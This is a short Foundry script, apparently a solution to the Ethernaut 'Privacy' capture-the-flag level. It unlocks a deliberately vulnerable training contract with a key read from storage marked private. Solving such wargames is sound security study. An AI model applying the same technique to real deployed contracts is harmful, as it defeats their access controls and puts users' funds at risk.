
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Privacy} from "../src/Lv-12/Privacy.sol";



contract PrivacyScript is Script {
    function run() public {
        vm.startBroadcast();
        //REPLACE ADDRESS WITH YOUR OWN Privacy INSTANCE ADDRESS
        Privacy priv =  Privacy(0x9A47f113F5ff72FB263B38A73B0E92018889aE22);
        bytes32 key = 0xb47ded344a4ef5471c09a79a0a7e06193b464b3ce422acc49d168fff535fdadf;
        priv.unlock(bytes16(key));
        vm.stopBroadcast();
    }
}
